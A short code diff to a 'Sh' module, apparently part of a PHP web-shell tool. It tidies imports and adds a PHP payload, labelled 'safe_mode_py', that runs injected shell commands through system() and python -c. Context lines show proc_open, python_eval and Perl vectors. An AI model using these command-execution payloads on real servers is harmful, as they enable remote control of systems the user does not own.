@@ -1,10 +1,9 @@
-from core.vectors import PhpCode
-from core.module import Module, Status
-from core.loggers import log
-from core.vectors import Os
-from core import messages
-from core import modules
 import random
+
+from core.module import Module, Status
+from core.vectors import Os
+from core.vectors import PhpCode
+
 
 class Sh(Module):
 
@@ -46,6 +45,7 @@ class Sh(Module):
                     proc_close($h);
                 }""", "proc_open"),
             PhpCode("""@python_eval('import os; os.system('${command}${stderr_redirection}');');""", "python_eval"),
+            PhpCode("""@system('python -c "import os;os.system('${command}${stderr_redirection}');"');""", "safe_mode_py"),
             PhpCode("""
                 if(class_exists('Perl')){
                     $perl=new Perl();
